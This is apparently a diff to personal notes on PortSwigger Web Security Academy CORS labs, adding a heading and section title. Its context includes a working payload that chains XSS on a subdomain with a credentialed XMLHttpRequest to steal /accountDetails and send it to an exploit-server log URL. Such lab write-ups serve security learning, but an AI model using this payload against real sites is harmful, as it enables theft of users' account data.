@@ -5,6 +5,7 @@ Date: Mon 12/12/2022
 
 ================= { START } ==============================
 
+## You try course if u have seen "Access-Control-Allow-Credentials: true" this kinda response headers!
 A) CORS vulnerability with basic origin reflection
 
     When we try to test CORS we will see the response if it contains the acess-control-allow-origin or acess-control-allow-credentials header. if it have that we will try to use the origin header on the request and try to see if he pass or block it. if it pass we can exploit it with some CORS POC scripts
@@ -53,8 +54,8 @@ C) CORS vulnerability with trusted insecure protocols
     on this lab when we try all they wont work except the method 4, there for we will try to find a subdomain, for that you can use tools, also you can check the site endpoints.
     finally, you will get stock.webacademy.com domain so we will try any open vuln on it if the site have some vuln like xss, we will craft our JS code like below.
 
-    <script>
+    `<script>
     document.location="http://stock.0a55009e038cde09c07b54ee00230042.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a55009e038cde09c07b54ee00230042.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a13006e037fdecbc0ae53ee0174000f.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
-    </script>
+    </script>`
 
-D) 
+D) CORS vulnerability with internal network pivot attack
